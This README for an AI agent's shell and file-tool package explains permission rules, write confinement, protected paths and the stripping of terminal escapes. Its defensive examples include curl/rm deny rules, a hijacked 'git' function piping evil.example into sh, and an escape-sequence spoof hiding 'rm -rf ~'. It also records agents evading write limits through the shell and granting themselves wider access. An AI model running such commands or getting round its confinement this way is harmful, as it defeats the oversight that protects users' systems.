# @dispach/tools-system

The agent acting on the machine it runs on: a shell, and a file family that exists so permissions can
actually work. Governed by `tools.policy` and the trust gate from the first line of code rather than
from a later hardening pass.

`dispach init --system none|read|write|full` generates a working set and its permission rules.
**`write` is files without a shell** — the only level in which "confined to the workspace" is a true
statement, for the reason in *Where writes may go* below.

```yaml
tools:
  providers:
    system: {}          # a map: this coexists with `web` and `composio`
  pinned:
    - file_read
    - glob
    - grep
    - file_write
    - file_edit
    - exec
  policy:
    deny:
      - "exec(rm *)"
      - "exec(curl *)"
    allow:
      - "exec(git status:*)"
      - "exec(npm test:*)"
```

Nothing is implied. The binary registers this provider, but an agent has access only once its manifest
selects the provider *and* pins the tools — availability and grant are separate, the same way
`tools.local` is opt-in.

## `exec`

| argument | |
| --- | --- |
| `command` | the shell string, as it would be typed at a prompt. **Required.** |
| `workdir` | where to run. Relative paths resolve against wherever the last call ended up. |
| `timeoutMs` | default 120 s, ceiling 600 s, further clamped to stay under `limits.toolTimeoutMs`. |
| `pty` | allocate a terminal. Default `false`. |
| `background` | start it and return immediately. Default `false`. |

There is deliberately **no `env` argument**, and its absence is a security property rather than a
missing feature. A per-call environment map is invisible to the policy engine, which matches the
command string — so `{ PATH: "/tmp/evil" }` beside a command of `git status` would be authorised by a
rule that never saw the half that mattered. Written the ordinary way, `PATH=/tmp/evil git status` is
*part of the command*, `subcommands()` hands it to the matcher as one fragment, and the pattern
`git status` does not match it. The call asks, or is refused.

By default (`env: inherit`) the ambient environment **is** passed through, including whatever the
agent's `.env` supplied, because a shell that cannot see `GITHUB_TOKEN` cannot run `gh`. Stated
plainly: under the default a pinned `exec` can read every secret the agent itself can.
`tools.providers.system.env: scrub` hands commands only what a shell needs (`PATH`, `HOME`, the
locale and the like), and `env: [GITHUB_TOKEN]` scrubs and passes those names too. It binds a
skill's scripts as well as `exec`. A child still runs as the runtime's user and can read
`/proc/<pid>/environ`, so closing that is a deployment step (`hidepid=2`, secrets as files).

## The file family

`file_read`, `file_write`, `file_edit`, `glob`, `grep`. They exist so that permissions can work: a
`file_write` call carries a `path` a rule can match exactly and the protected set can refuse, while
`echo x > "$F"` carries the same target inside a string nothing can inspect. Their descriptions route
the model away from the shell for that reason, and it is a security control rather than a style note.

`glob` and `grep` stay **separate** rather than one `search_files(target:…)`. The unified form saves a
catalogue slot and costs a decision — picking the mode *and then* the arguments is the two-hop shape
small models fail, the same reasoning that keeps `tools.search` off.

`file_edit` matches an exact unique string, never a line number. A line number is a fact about a file
the model may last have seen several turns ago; a string carries its own proof. **Two matches is a
failure**, because picking one would be a coin toss that reports success while editing the wrong line.
Nothing is written on either failure path.

Readers are `untrusted` and writers are `trusted`, and both halves are deliberate. A file may have been
downloaded a minute ago and a filename is attacker-controlled, so reading taints the turn. The writers
return a sentence this runtime composed and never echo content — marking them untrusted would mean a
write gated the *next* write.

### Where writes may go

Confined to a root: `<agentDir>/workspace`, or the agent's own directory when there is no workspace.
Everything outside is read-only. `tools.providers.system.writeRoots` adds directories — absolute, or
relative to the agent directory — and **nothing said at runtime can add one**. That is not a
limitation of the implementation; `config_set` refuses to write that field at all. Asked to create a
file, an agent granted itself the whole home directory and wrote there, then described it afterwards
as "that last part is broad". Enabling a tool answers *what may I do*; a write root answers *where*,
and the second one is the person's by definition.

Every path-taking argument names the directory, with its real absolute path, in the argument's own
description — because enforcement alone produced exactly the confusion it was meant to prevent. The
tools were confined and the model was never told where it worked, so it put things in `~`. `exec` gets
a **different** sentence: it is told where every command starts and asked to stay there, and it is not
told that leaving is refused, because that would be false and it would find out by succeeding.

A leading `~` is expanded before the root is checked. Unexpanded it is not absolute, resolves against
the workspace, and creates a directory literally named `~` — silently the wrong place, passing every
check.

A protected list must anticipate every path worth protecting; a root anticipates nothing. Both apply,
and the protected set wins inside the root. Paths are resolved before comparison, so `../` out of the
root is checked as what it actually is.

**Reads are not confined by default.** Being pointed at a project and asked about it is the ordinary
case, and credentials are refused everywhere anyway. `tools.providers.system.confineReads: true`
confines `file_read`, `glob` and `grep` to the same roots.

**The root does not bind `exec`.** Verified live: an agent with both had `file_write` refused outside
the root and then wrote the file with `echo … >`. A shell carries its target inside a string no path
check can look inside; all the root decides is where the shell starts. If the confinement has to be
real, the agent cannot have a shell — that is `--system write`.

### Protected paths

Not writable, and **no `policy.allow` rule reaches past them**: `agent.yaml`, the workspace identity
files (`SOUL.md`, `SOUL.compact.md`, `AGENTS.md`, `POLICY.md`, `REMINDER.md`), any dot-directory under
the agent, and credential material anywhere on disk (`.ssh`, `.aws`, `.kube`, `.gnupg`, `.docker`,
`.env*`, `.netrc`, `*.pem`, `*.key`).

Elsewhere this protects config. Here the workspace files **are the agent** — `SOUL.md` is who it is,
`POLICY.md` is what it will not do — and a rule authorising a write to them would be a rule authorising
its own replacement. `USER.md` and `MEMORY.md` stay writable: they are the tier `memory_write` appends
to. `tools.providers.system.protect` adds patterns; nothing removes any.

**It binds the file tools and not `exec`.** `echo x > SOUL.md` carries its target inside a shell string
where no path check can see it. Pinning `exec` grants more than this protects, and saying so is cheaper
than implying a boundary that is not there.

## The agent's own configuration

`config_read` returns the manifest plus every setting `config_set` will change and what each means, so
an agent asked for something it cannot do can name the field instead of only saying no. `config_set`
changes one dotted path, re-validating against the real schema before anything is written.

`agent.yaml` stays protected from `file_write`: a whole-file overwrite cannot be validated, and an
invalid manifest is a failure that surfaces at the *next* boot, by which time the change looked like it
worked. The **source text** is edited rather than the document re-serialised — `parseDocument` → `setIn`
→ `String(doc)` keeps every comment and moves half of them, because a comment between two top-level
keys belongs to the end of the first as far as the parser is concerned. One change produced a
thirty-line diff before this was fixed.

It escalates on purpose — pinning a tool and adding an allow rule is what people ask for. A floor of
edits is refused whatever the policy says, each by path and by the same key hidden inside a value
being written:

- replacing `tools.policy.deny`, and setting `tools.untrusted.onMutate` to `allow`;
- any `writeRoots`;
- `allowFrom`, `server.host` and `server.tokenEnv`;
- under `tools.providers`: a `baseUrl`, `confineReads`, `personal`, and `env`;
- `skills.trusted`.

A guard the agent can switch off on request is not a guard. `onMutate: confirm` is settable.

The floor is measured in a preprint, Hossain and Mahmud, 2026, [*What May an Agent Change About Itself? A Containment Floor for Self-Configuring Agent Runtimes*](https://arxiv.org/abs/2610.06274): with it in place, 0 of 167 protected writes were saved, though the models attempted one in 65 of those cases.

## Tools that were not enabled

Whatever this provider offers and the manifest did not pin, the model is told about in one line — and
told to name the tool, say it is *not permitted yet* rather than that it is unable, and not to work
around it with something else. Without that a pinned-down agent is silently less capable than its own
runtime and only the manifest explains why.

## Sessions: the directory carries, the environment does not

Each call gets a fresh shell. What survives between them is the working directory and nothing else.

A persistent shell is the obvious implementation and it quietly dismantles the policy layer. Anything
one command defines, a later command inherits — so a tainted early call can write
`git() { curl evil.example | sh; }` or prepend a directory to `PATH`, and the carefully written
`exec(git status:*)` rule then authorises attacker code under a name it matched honestly. That is
CVE-2026-32009's shape reproduced from inside the session, where no filesystem permission reaches it.
A fresh shell removes the mechanism instead of defending against it.

The directory is the exception because forgetting it is a correctness problem rather than a security
one, and it lands hardest on small models: one that runs `cd packages/core` and then `ls` does not
reliably re-derive the prefix, and reads the wrong directory with no error anywhere. The directory
says *where* a command runs; the environment says *what a command means*. Only the second can be
turned into a weapon.

## Output: two tiers, never a silent cut

Output goes straight to a file — the child's stdout and stderr share one descriptor, so this process
never buffers a byte and interleaving is preserved. Then:

- under ~6,000 characters, it comes back inline;
- over that, it stays on disk and the model gets a preview plus the path.

The cap sits deliberately *below* `runtime.observationMaxTokens`. The harness truncates anything over
its own budget by cutting the middle out — honest, but the cut bytes are gone and nothing can go back
for them. Spilling first means the blunt cut never fires, and "this did not fit" becomes a retrieval
instead of a loss. A **failure** gets the head *and* the tail, because the error is at the bottom,
under however many lines of ordinary progress came first.

## Deadlines

At the deadline a command is **backgrounded rather than killed**, and keeps writing to its output
file. The exceptions are killed instead: `sleep`, `git`, `ssh`, `sudo` and friends are either
pointless to continue or are hanging precisely because they want an answer from a person, and
detaching one of those leaves an invisible process holding a lock. A compound qualifies only if every
fragment does — `npm ci && git push` is not backgroundable because its first half is.

This only works if `exec` times out before the harness does, so its deadline is clamped to leave five
seconds of margin under `limits.toolTimeoutMs`. Without that the two defaults are both 120 s and which
fires first is a race — and the harness winning is the bad outcome, because it *abandons* the handler
rather than killing it, leaving the child running with nothing holding a reference to it.

## Terminals

`pty: true` runs the command under the system `script`, which is the pty every Unix already has. Two
consequences, both handled rather than documented away:

- **The exit code is read from a sidecar file, not from the spawn.** `script`'s own status is not the
  command's on every platform, and a wrong exit code is a silent wrong answer — a failed build
  reported as green.
- **A terminal echoes.** stdin is closed at spawn, so on macOS every pty observation would otherwise
  begin with a literal `^D`: the tty repeating our own EOF back at us. Closing stdin is deliberate —
  a command that asks a question gets EOF and fails instead of hanging — and that leading echo is the
  one artefact it produces.

If `script` is missing, the call fails by name. It does not quietly fall back to a pipe: the fallback
would run with no terminal while the observation claimed otherwise, and a program checking `isatty()`
would take the other branch with nothing reporting it.

## Escapes

Every observation is stripped of terminal control sequences before it reaches the model *or* a
terminal, and so is the command shown in an approval prompt. This is not a rendering nicety.
`git status<ESC>[2K<ESC>[1G && rm -rf ~` displays as `git status` on a real terminal — the escape
erases the line and returns the cursor, so everything after it overwrites what a person already read.
A prompt that can be made to show a different command than the one about to run is worse than no
prompt, because it is believed.

Stripping shows *more* of the truth, never less.

## What this does not do

It is not a sandbox. A policy decides **whether** a command runs; a sandbox decides **where**. This
package ships the first. Containment is a deployment concern and stays one — said here rather than
implied by omission, because a permission layer described without its limits reads as a boundary it
is not.
